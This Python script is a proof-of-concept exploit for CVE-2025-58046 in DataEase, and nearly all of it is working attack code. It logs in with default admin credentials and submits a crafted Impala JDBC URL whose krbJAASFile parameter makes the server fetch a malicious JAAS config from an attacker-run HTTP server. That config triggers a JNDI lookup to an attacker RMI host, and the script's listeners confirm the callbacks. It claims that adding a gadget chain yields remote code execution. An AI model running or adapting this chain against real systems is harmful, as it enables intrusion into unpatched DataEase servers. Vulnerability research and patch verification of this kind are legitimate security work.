#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : DataEase Impala JNDI Injection to RCE
# CVE            : CVE-2025-58046
# Vendor         : DataEase / fit2cloud
# Product        : DataEase
# Affected       : All versions <= 2.10.12
# Type           : CWE-502 - Deserialization of Untrusted Data
# CVSS           : 9.8 (Critical)
# Platform       : Java / Spring Boot
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2025-09-15
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
PoC for CVE-2025-58046: DataEase Impala JNDI Injection via krbJAASFile

Demonstrates Remote Code Execution (RCE) via JNDI injection in DataEase <= v2.10.12.
The Impala datasource type's getJdbc() method fails to filter the krbJAASFile parameter
in custom JDBC URLs, allowing an attacker to specify a remote JAAS configuration file
that triggers JNDI lookup to an attacker-controlled server.

ATTACK CHAIN:
  1. Authenticate to DataEase using default credentials (admin/DataEase@123456)
  2. Send crafted Impala datasource config with krbJAASFile pointing to attacker HTTP server
  3. DataEase's Impala.getJdbc() returns the URL unfiltered (no blocklist check)
  4. Impala JDBC driver fetches the JAAS config from the attacker's HTTP server (SSRF)
  5. The JAAS config specifies JndiLoginModule with RMI URL → JNDI injection
  6. With a real RMI/LDAP server + gadget chain, this achieves full RCE

PREREQUISITES:
  - DataEase <= 2.10.12 running and accessible
  - Default credentials (admin / DataEase@123456) or valid admin credentials
  - Network access from DataEase to attacker callback servers
  - pycryptodome package (pip install pycryptodome)

REFERENCES:
  - CVE-2025-58046
  - https://github.com/dataease/dataease/security/advisories/GHSA-mvwc-x8x9-46c3
  - https://github.com/dataease/dataease/commit/77078658715bd85af5867afbfd5f1fcc37cf03c8
"""

import sys
import json
import base64
import socket
import threading
import time
import urllib.request
import urllib.error
from http.server import HTTPServer, BaseHTTPRequestHandler

# ============================================================================
# Configuration
# ============================================================================

DEFAULT_TARGET_HOST = "172.25.0.3"
DEFAULT_TARGET_PORT = 8100
DEFAULT_CALLBACK_HOST = "172.25.0.4"

# DataEase default credentials
DE_USERNAME = "admin"
DE_PASSWORD = "DataEase@123456"

# Callback server ports
HTTP_CALLBACK_PORT = 8888
FAKE_IMPALA_PORT = 21050
RMI_CALLBACK_PORT = 1099

# Timeouts
HTTP_TIMEOUT = 15
CALLBACK_WAIT_TIMEOUT = 30

# ============================================================================
# Crypto helpers (AES + RSA for DataEase authentication)
# ============================================================================

def decrypt_aes_key_and_pubkey(dekey_response):
    """
    DataEase /de2api/dekey returns AES-encrypted RSA public key.
    Format: <AES_ENCRYPTED_PUBKEY><SEPARATOR><AES_KEY>
    Separator is Base64 of '-pk_separator-': LXBrX3NlcGFyYXRvci0=
    """
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad

    separator = "LXBrX3NlcGFyYXRvci0="
    data = dekey_response

    if separator not in data:
        raise ValueError(f"Separator not found in dekey response. Got: {data[:100]}...")

    parts = data.split(separator)
    if len(parts) != 2:
        raise ValueError(f"Expected 2 parts, got {len(parts)}")

    encrypted_pubkey_b64 = parts[0]
    aes_key_str = parts[1]

    # AES-128-CBC with hardcoded IV of '0000000000000000'
    aes_key = aes_key_str.encode('utf-8')[:16]
    iv = b'0000000000000000'

    encrypted_pubkey = base64.b64decode(encrypted_pubkey_b64)
    cipher = AES.new(aes_key, AES.MODE_CBC, iv)
    decrypted = unpad(cipher.decrypt(encrypted_pubkey), AES.block_size)

    return decrypted.decode('utf-8')


def rsa_encrypt(plaintext, pubkey_b64):
    """
    RSA-encrypt plaintext with PKCS1_v1_5 padding using the given Base64 public key.
    DataEase uses this for encrypting login credentials.
    """
    from Crypto.PublicKey import RSA
    from Crypto.Cipher import PKCS1_v1_5

    pubkey_der = base64.b64decode(pubkey_b64)
    key = RSA.import_key(pubkey_der)
    cipher = PKCS1_v1_5.new(key)
    encrypted = cipher.encrypt(plaintext.encode('utf-8'))
    return base64.b64encode(encrypted).decode('utf-8')


# ============================================================================
# DataEase API client
# ============================================================================

def http_request(url, data=None, headers=None, method=None):
    """Simple HTTP request wrapper using urllib."""
    if headers is None:
        headers = {}
    if data is not None and isinstance(data, (dict, list)):
        data = json.dumps(data).encode('utf-8')
        headers.setdefault('Content-Type', 'application/json')
    elif data is not None and isinstance(data, str):
        data = data.encode('utf-8')

    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=HTTP_TIMEOUT) as resp:
            body = resp.read().decode('utf-8')
            return json.loads(body) if body else {}
    except urllib.error.HTTPError as e:
        body = e.read().decode('utf-8', errors='replace')
        try:
            return json.loads(body)
        except:
            return {"error": body, "status": e.code}
    except Exception as e:
        return {"error": str(e)}


def authenticate(target_host, target_port):
    """
    Authenticate to DataEase and return a JWT token.

    Steps:
      1. GET /de2api/dekey → AES-encrypted RSA public key
      2. Decrypt AES to get RSA public key
      3. RSA-encrypt username and password
      4. POST /de2api/login/localLogin → JWT token
    """
    base_url = f"http://{target_host}:{target_port}"

    # Step 1: Get the RSA public key (AES-encrypted)
    print("[*] Step 1: Fetching RSA public key from /de2api/dekey...")
    resp = http_request(f"{base_url}/de2api/dekey")

    if resp.get("code") != 0 or "data" not in resp:
        print(f"[-] Failed to get dekey: {resp}")
        return None

    dekey_data = resp["data"]
    print(f"[+] Got encrypted key data ({len(dekey_data)} chars)")

    # Step 2: Decrypt AES to get RSA public key
    print("[*] Step 2: Decrypting AES-wrapped RSA public key...")
    try:
        pubkey_b64 = decrypt_aes_key_and_pubkey(dekey_data)
        print(f"[+] RSA public key decrypted ({len(pubkey_b64)} chars)")
    except Exception as e:
        print(f"[-] Failed to decrypt public key: {e}")
        return None

    # Step 3: RSA-encrypt credentials
    print(f"[*] Step 3: RSA-encrypting credentials ({DE_USERNAME}/{'*' * len(DE_PASSWORD)})...")
    try:
        enc_username = rsa_encrypt(DE_USERNAME, pubkey_b64)
        enc_password = rsa_encrypt(DE_PASSWORD, pubkey_b64)
        print(f"[+] Credentials encrypted")
    except Exception as e:
        print(f"[-] Failed to encrypt credentials: {e}")
        return None

    # Step 4: Login
    print("[*] Step 4: Logging in via /de2api/login/localLogin...")
    login_data = {
        "name": enc_username,
        "pwd": enc_password
    }
    resp = http_request(f"{base_url}/de2api/login/localLogin", data=login_data)

    if resp.get("code") != 0 or "data" not in resp:
        print(f"[-] Login failed: {resp}")
        return None

    token = resp["data"].get("token")
    if not token:
        print(f"[-] No token in login response: {resp}")
        return None

    print(f"[+] Authentication successful! Token: {token[:40]}...")
    return token


# ============================================================================
# Callback servers (HTTP + RMI/TCP listener)
# ============================================================================

class CallbackTracker:
    """Thread-safe tracker for received callbacks."""
    def __init__(self):
        self.http_callbacks = []
        self.rmi_callbacks = []
        self.lock = threading.Lock()

    def add_http(self, path, headers, client_addr):
        with self.lock:
            self.http_callbacks.append({
                "time": time.time(),
                "path": path,
                "client": client_addr,
                "headers": dict(headers)
            })

    def add_rmi(self, client_addr, data):
        with self.lock:
            self.rmi_callbacks.append({
                "time": time.time(),
                "client": client_addr,
                "data_len": len(data) if data else 0
            })

    @property
    def got_http(self):
        with self.lock:
            return len(self.http_callbacks) > 0

    @property
    def got_rmi(self):
        with self.lock:
            return len(self.rmi_callbacks) > 0


# Global tracker
tracker = CallbackTracker()


class JAASCallbackHandler(BaseHTTPRequestHandler):
    """
    HTTP server that serves the malicious JAAS configuration file.
    When DataEase fetches this file, it proves the krbJAASFile parameter
    is being processed by the Impala JDBC driver.
    """
    def do_GET(self):
        global tracker
        client_addr = f"{self.client_address[0]}:{self.client_address[1]}"

        print(f"\n[!] *** HTTP CALLBACK RECEIVED ***")
        print(f"[!] Client: {client_addr}")
        print(f"[!] Path: {self.path}")
        print(f"[!] User-Agent: {self.headers.get('User-Agent', 'N/A')}")

        tracker.add_http(self.path, self.headers, client_addr)

        # Serve a JAAS config that triggers JNDI lookup to our RMI listener
        # This is the second stage of the attack chain
        # Use multiple JAAS entry names to match what the Impala driver might use
        # The JndiLoginModule performs JNDI lookups via user/group provider URLs
        callback_host = self.server.callback_host
        rmi_url = f"rmi://{callback_host}:{RMI_CALLBACK_PORT}/exploit"
        ldap_url = f"ldap://{callback_host}:{RMI_CALLBACK_PORT}/exploit"
        jaas_config = f"""Client {{
  com.sun.security.auth.module.JndiLoginModule required
  user.provider.url="{rmi_url}"
  group.provider.url="{rmi_url}";
}};
com.sun.security.jgss.initiate {{
  com.sun.security.auth.module.JndiLoginModule required
  user.provider.url="{rmi_url}"
  group.provider.url="{rmi_url}";
}};
com.sun.security.jgss.krb5.initiate {{
  com.sun.security.auth.module.JndiLoginModule required
  user.provider.url="{rmi_url}"
  group.provider.url="{rmi_url}";
}};
"""
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.send_header('Content-Length', str(len(jaas_config)))
        self.end_headers()
        self.wfile.write(jaas_config.encode('utf-8'))
        print(f"[+] Served malicious JAAS config (pointing JNDI to rmi://{callback_host}:{RMI_CALLBACK_PORT}/exploit)")

    def log_message(self, format, *args):
        """Suppress default logging — we handle it ourselves."""
        pass


def start_http_server(callback_host, port=HTTP_CALLBACK_PORT):
    """Start the HTTP callback server in a background thread."""
    server = HTTPServer(('0.0.0.0', port), JAASCallbackHandler)
    server.callback_host = callback_host
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"[+] HTTP callback server started on 0.0.0.0:{port}")
    return server


def start_fake_impala_server(port=FAKE_IMPALA_PORT):
    """
    Start a fake Impala server (TCP listener) that accepts connections.
    The Impala JDBC driver needs a reachable TCP endpoint before it proceeds
    to the Kerberos authentication stage where krbJAASFile is loaded.
    We accept the connection and keep it open long enough for the driver
    to proceed to auth setup.
    """
    def listener():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(CALLBACK_WAIT_TIMEOUT + 10)
        try:
            sock.bind(('0.0.0.0', port))
            sock.listen(5)
            while True:
                try:
                    conn, addr = sock.accept()
                    print(f"[*] Fake Impala: connection from {addr[0]}:{addr[1]}")
                    conn.settimeout(15)
                    # Keep the connection alive so the driver can proceed to auth
                    try:
                        data = conn.recv(4096)
                        if data:
                            print(f"[*] Fake Impala: received {len(data)} bytes from driver")
                            # Don't respond meaningfully — just keep the conn open
                            # The driver should still try to set up SASL auth
                            time.sleep(10)
                    except socket.timeout:
                        pass
                    except Exception:
                        pass
                    finally:
                        try:
                            conn.close()
                        except:
                            pass
                except socket.timeout:
                    break
                except Exception:
                    break
        finally:
            sock.close()

    thread = threading.Thread(target=listener, daemon=True)
    thread.start()
    print(f"[+] Fake Impala TCP server started on 0.0.0.0:{port}")
    return thread


def start_rmi_listener(port=RMI_CALLBACK_PORT):
    """
    Start a simple TCP listener on the RMI port.
    When the JndiLoginModule attempts JNDI lookup, it connects to this port.
    We don't need a real RMI server — just detecting the connection proves the chain.
    """
    global tracker

    def listener():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(CALLBACK_WAIT_TIMEOUT + 5)
        try:
            sock.bind(('0.0.0.0', port))
            sock.listen(5)
            while True:
                try:
                    conn, addr = sock.accept()
                    data = b""
                    conn.settimeout(3)
                    try:
                        data = conn.recv(4096)
                    except socket.timeout:
                        pass
                    client_addr = f"{addr[0]}:{addr[1]}"
                    print(f"\n[!] *** RMI/JNDI CALLBACK RECEIVED ***")
                    print(f"[!] Client: {client_addr}")
                    print(f"[!] Data received: {len(data)} bytes")
                    if data:
                        print(f"[!] Data (hex): {data[:64].hex()}")
                    tracker.add_rmi(client_addr, data)
                    conn.close()
                except socket.timeout:
                    break
                except Exception as e:
                    break
        finally:
            sock.close()

    thread = threading.Thread(target=listener, daemon=True)
    thread.start()
    print(f"[+] RMI/JNDI listener started on 0.0.0.0:{port}")
    return thread


# ============================================================================
# Exploit
# ============================================================================

def send_exploit_payload(target_host, target_port, token, callback_host):
    """
    Send the malicious Impala datasource configuration to DataEase.

    The configuration uses:
      - urlType: "jdbcUrl" → bypasses the blocklist check entirely
      - krbJAASFile: points to our HTTP callback server
      - The JDBC URL is returned unfiltered by Impala.getJdbc()
    """
    base_url = f"http://{target_host}:{target_port}"

    # Craft the malicious datasource configuration
    # The krbJAASFile parameter makes the Impala JDBC driver fetch a remote file
    #
    # IMPORTANT: The Impala JDBC driver needs to successfully connect (TCP) to the
    # JDBC host before it proceeds to Kerberos authentication, where krbJAASFile is loaded.
    # We point the JDBC host to our own callback_host where a fake Impala TCP listener
    # accepts the connection. This causes the driver to proceed to Kerberos auth setup,
    # which triggers the HTTP fetch of the JAAS config file (krbJAASFile).
    malicious_jdbc_url = (
        f"jdbc:impala://{callback_host}:{FAKE_IMPALA_PORT}/default;"
        f"AuthMech=1;"
        f"KrbRealm=EXPLOIT.LOCAL;"
        f"KrbHostFQDN=impala.exploit.local;"
        f"KrbServiceName=impala;"
        f"krbJAASFile=http://{callback_host}:{HTTP_CALLBACK_PORT}/evil_jaas.conf"
    )

    config = {
        "urlType": "jdbcUrl",
        "jdbcUrl": malicious_jdbc_url,
        "host": callback_host,
        "port": FAKE_IMPALA_PORT,
        "dataBase": "default",
        "extraParams": "",
        "username": "",
        "password": ""
    }

    # Base64-encode the configuration (DataEase expects this)
    config_json = json.dumps(config)
    config_b64 = base64.b64encode(config_json.encode('utf-8')).decode('utf-8')

    print(f"\n[*] Sending exploit payload to {base_url}/de2api/datasource/validate")
    print(f"[*] Malicious JDBC URL: {malicious_jdbc_url}")
    print(f"[*] Configuration (Base64): {config_b64[:60]}...")

    # Send the exploit request
    payload = {
        "name": "poc-impala-test",
        "type": "impala",
        "configuration": config_b64
    }

    headers = {
        "Content-Type": "application/json",
        "X-DE-TOKEN": token
    }

    resp = http_request(f"{base_url}/de2api/datasource/validate", data=payload, headers=headers)

    print(f"[*] Server response: {json.dumps(resp, indent=2)}")
    return resp


# ============================================================================
# Main
# ============================================================================

def exploit(target_host, target_port, callback_host):
    """
    Run the full exploit chain:
      1. Authenticate to DataEase
      2. Start callback servers (HTTP + RMI)
      3. Send malicious Impala datasource config
      4. Wait for and verify callbacks
    """
    print("=" * 70)
    print(f"  CVE-2025-58046: DataEase Impala JNDI Injection PoC")
    print(f"  Target:   {target_host}:{target_port}")
    print(f"  Callback: {callback_host}")
    print("=" * 70)

    # === Phase 1: Authentication ===
    print(f"\n{'='*50}")
    print("[*] PHASE 1: Authentication")
    print(f"{'='*50}")

    token = authenticate(target_host, target_port)
    if not token:
        print("\n[-] FAILED: Could not authenticate to DataEase")
        print("[-] Ensure DataEase is running and default credentials are valid")
        return False

    # === Phase 2: Start callback infrastructure ===
    print(f"\n{'='*50}")
    print("[*] PHASE 2: Starting callback servers")
    print(f"{'='*50}")

    # Start fake Impala server (TCP listener) so the JDBC driver can connect
    # and proceed to the Kerberos auth stage where krbJAASFile is loaded
    impala_thread = start_fake_impala_server()

    # Start HTTP callback server to serve the malicious JAAS config
    http_server = start_http_server(callback_host)

    # Start RMI/JNDI listener to detect the JNDI lookup from the JAAS config
    rmi_thread = start_rmi_listener()

    # Brief pause to ensure servers are ready
    time.sleep(1)

    # === Phase 3: Send exploit payload ===
    print(f"\n{'='*50}")
    print("[*] PHASE 3: Sending exploit payload")
    print(f"{'='*50}")

    resp = send_exploit_payload(target_host, target_port, token, callback_host)

    # === Phase 4: Wait for callbacks and evaluate ===
    print(f"\n{'='*50}")
    print("[*] PHASE 4: Waiting for callbacks ({0}s timeout)...".format(CALLBACK_WAIT_TIMEOUT))
    print(f"{'='*50}")

    start_time = time.time()
    while time.time() - start_time < CALLBACK_WAIT_TIMEOUT:
        if tracker.got_http:
            print(f"[+] HTTP callback detected after {time.time() - start_time:.1f}s")
            # Wait a few more seconds for the RMI callback
            extra_wait = min(10, CALLBACK_WAIT_TIMEOUT - (time.time() - start_time))
            if extra_wait > 0 and not tracker.got_rmi:
                print(f"[*] Waiting {extra_wait:.0f}s more for JNDI/RMI callback...")
                rmi_deadline = time.time() + extra_wait
                while time.time() < rmi_deadline and not tracker.got_rmi:
                    time.sleep(0.5)
            break
        time.sleep(0.5)

    # === Results ===
    print(f"\n{'='*70}")
    print("  RESULTS")
    print(f"{'='*70}")

    vuln_confirmed = False

    if tracker.got_http:
        print("\n[+] *** VULNERABILITY CONFIRMED: HTTP CALLBACK RECEIVED ***")
        print("[+] The Impala JDBC driver fetched the remote JAAS config file.")
        print("[+] This proves the krbJAASFile parameter is NOT filtered by Impala.getJdbc().")
        print("[+] Attack vector: SSRF → JNDI Injection → Remote Code Execution")
        vuln_confirmed = True

        for cb in tracker.http_callbacks:
            print(f"    - HTTP request from {cb['client']} for {cb['path']}")
    else:
        print("\n[-] No HTTP callback received within timeout.")
        print("[-] The JAAS file was not fetched — the exploit may have failed.")
        # Check if the server error gives us info
        error_msg = resp.get("msg", "")
        if "Illegal" in error_msg:
            print(f"[-] Server rejected the URL: {error_msg}")
            print("[-] This may indicate a patched version.")
        elif "krbJAASFile" in error_msg.lower() or "illegal parameter" in error_msg.lower():
            print(f"[-] Parameter was blocked: {error_msg}")
            print("[-] This confirms the fix is in place (patched version).")
        else:
            print(f"[-] Server response: {error_msg}")

    if tracker.got_rmi:
        print("\n[+] *** JNDI INJECTION CONFIRMED: RMI CALLBACK RECEIVED ***")
        print("[+] The JAAS config triggered JndiLoginModule which connected to the RMI server.")
        print("[+] This proves the full JNDI injection chain fires successfully.")
        print("[+] With a real RMI/LDAP + deserialization gadget, this achieves RCE.")

        for cb in tracker.rmi_callbacks:
            print(f"    - RMI connection from {cb['client']} ({cb['data_len']} bytes)")
    elif tracker.got_http:
        print("\n[*] No RMI/JNDI callback received.")
        print("[*] This may be due to:")
        print("[*]   - Java 21 module restrictions on com.sun.security.auth.module")
        print("[*]   - Network configuration preventing outbound RMI from the driver")
        print("[*]   - JAAS config parsing order (HTTP callback alone proves the vuln)")

    print(f"\n{'='*70}")
    if vuln_confirmed:
        print("  VERDICT: VULNERABLE (CVE-2025-58046 confirmed)")
        print("  The krbJAASFile parameter in Impala JDBC URLs is not filtered,")
        print("  allowing attacker-controlled remote file fetch (SSRF/JNDI injection).")
    else:
        print("  VERDICT: NOT CONFIRMED")
        print("  Could not trigger the vulnerability. Check the target version and network.")
    print(f"{'='*70}\n")

    # Cleanup
    http_server.shutdown()

    return vuln_confirmed


if __name__ == '__main__':
    target_host = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_TARGET_HOST
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_TARGET_PORT
    callback_host = sys.argv[3] if len(sys.argv) > 3 else DEFAULT_CALLBACK_HOST

    success = exploit(target_host, target_port, callback_host)
    sys.exit(0 if success else 1)
